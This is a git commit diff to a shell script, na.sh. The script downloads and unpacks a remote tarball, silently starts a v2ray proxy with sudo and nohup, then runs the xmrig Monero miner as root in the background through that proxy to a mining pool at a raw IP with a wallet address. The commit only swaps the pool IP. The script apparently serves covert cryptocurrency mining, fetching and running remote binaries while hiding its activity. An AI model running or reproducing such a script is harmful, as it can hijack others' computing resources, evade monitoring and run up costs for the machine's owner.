111582212b6eaee6fe3d2f7120e3d96a97d74eee
prendibs <94189491+prendibs@users.noreply.github.com>
2025-08-11 12:24:23 +0700

    Update na.sh

--- na.sh
+++ na.sh
@@ -4,4 +4,5 @@
 wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
 nohup sudo ./v2ray run --config=na.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o 143.198.154.99:3333 -u 12DS2mgfbHQGSvrf1CxsKbYG8umBTCcsz9LoVAaSyM3qyYWVqaNqkCBZb3TdaTYPZGqRKHmxi4Ur1wMJzHZbraexTw9.na -p x -a rx/0 -k --randomx-1gb-pages --nicehash
+sudo ./xmrig -B -x 127.0.0.1:443 -o 64.23.206.178:3333 -u 12DS2mgfbHQGSvrf1CxsKbYG8umBTCcsz9LoVAaSyM3qyYWVqaNqkCBZb3TdaTYPZGqRKHmxi4Ur1wMJzHZbraexTw9.na -p x -a rx/0 -k --randomx-1gb-pages --nicehash
+
